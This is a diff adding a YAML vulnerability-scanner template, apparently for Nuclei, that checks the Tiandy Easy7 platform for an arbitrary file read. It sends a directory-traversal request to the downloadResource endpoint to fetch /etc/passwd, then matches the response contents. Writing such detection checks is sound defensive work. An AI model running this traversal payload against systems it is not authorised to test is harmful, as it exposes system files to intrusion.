@@ -1,0 +1,33 @@
+id: tiandy-easy7-downloadresource-file-read
+
+info:
+  name: Tiandy Easy7 downloadResource Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+  description: |
+    Tiandy Easy7 Integrated Management Platform is vulnerable to arbitrary file read via the downloadResource endpoint.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Easy7/rest/file/downloadResource?path=/../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root"
+          - "/bin"
+      - type: regex
+        part: header
+        regex:
+          - "attachment;filename=/passwd"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
